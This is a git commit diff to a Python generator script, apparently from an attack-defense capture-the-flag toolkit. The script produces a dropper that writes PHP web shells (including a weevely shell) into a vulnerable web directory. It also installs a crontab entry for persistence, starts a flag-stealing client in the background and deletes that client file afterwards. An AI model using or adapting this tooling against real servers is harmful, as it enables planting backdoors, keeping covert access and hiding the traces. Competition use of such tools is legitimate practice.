c85879065568ad8462e24bbad4ede8e498e036a6
Arckman <fengrj1989@gmail.com>
2017-09-07 11:52:54 +0800

    add crontab,change subprocess call unblocked

--- AD_scripts/generator.py
+++ AD_scripts/generator.py
@@ -11,6 +11,9 @@ f4_name='asset.php' #small shell
 f4_path='web_vul_path'
 f5_name='weevely.php'   #weevely shell
 f5_path='web_vul_path'
+f6_name='1' #crontab
+f6_path='py_path'
+f6_shell=r'*/5 * * * * whoami\x0a'   #crontab file must contains 0x0a to be installed
 
 php_path=r'php'
 f1=open(r'./getFlag/client.py','r').read()
@@ -44,7 +47,9 @@ f4_name='%s'
 f4_path=%s
 f5_name='%s'
 f5_path=%s
-'''%(f1_name,f1_path,f2_name,f2_path,f3_name,f3_path,f4_name,f4_path,f5_name,f5_path))
+f6_name='%s'
+f6_path=%s
+'''%(f1_name,f1_path,f2_name,f2_path,f3_name,f3_path,f4_name,f4_path,f5_name,f5_path,f6_name,f6_path))
 
 f.write('''
 f1=\'\'\'%s\'\'\'
@@ -61,19 +66,29 @@ f4=\'\'\'%s\'\'\'
 f.write('''
 f5=\'\'\'%s\'\'\'
 '''%(f5,))
+f.write('''
+f6_shell=\"%s\"
+'''%(f6_shell,))
 
-f.write('''open(f1_path+os.sep+f1_name,'w').write(f1)
-subprocess.check_output("chmod a+x %s"%(f1_path+os.sep+f1_name,),shell=True)
+f.write('''
+open(f1_path+os.sep+f1_name,'w').write(f1)
+subprocess.call("chmod a+x %s"%(f1_path+os.sep+f1_name,),shell=True)
 open(f2_path+os.sep+f2_name,'w').write(f2)
 open(f3_path+os.sep+f3_name,'w').write(f3)
 open(f4_path+os.sep+f4_name,'w').write(f4)
 open(f5_path+os.sep+f5_name,'w').write(f5)
+open(f6_path+os.sep+f6_name,'wb').write(f6_shell)
 
-subprocess.check_output("nohup %s %s &"%(f1_path+os.sep+f1_name,"--mode automatic"),shell=True)
-# subprocess.check_output("rm %s"%(py_path+os.sep+f1_name,),shell=True)
-#delete self
+subprocess.call("crontab %s"%(f6_path+os.sep+f6_name,),shell=True)
 time.sleep(1)
+#subprocess.call("rm %s"%(f6_path+os.sep+f6_name,),shell=True)
+
+subprocess.call("nohup %s %s &"%(f1_path+os.sep+f1_name,"--mode automatic"),shell=True)
+time.sleep(1)
+subprocess.call("rm %s"%(py_path+os.sep+f1_name,),shell=True)
+
+#delete self
 # os.remove(__file__)
-# print __file__
+print __file__
 ''')
 f.close()
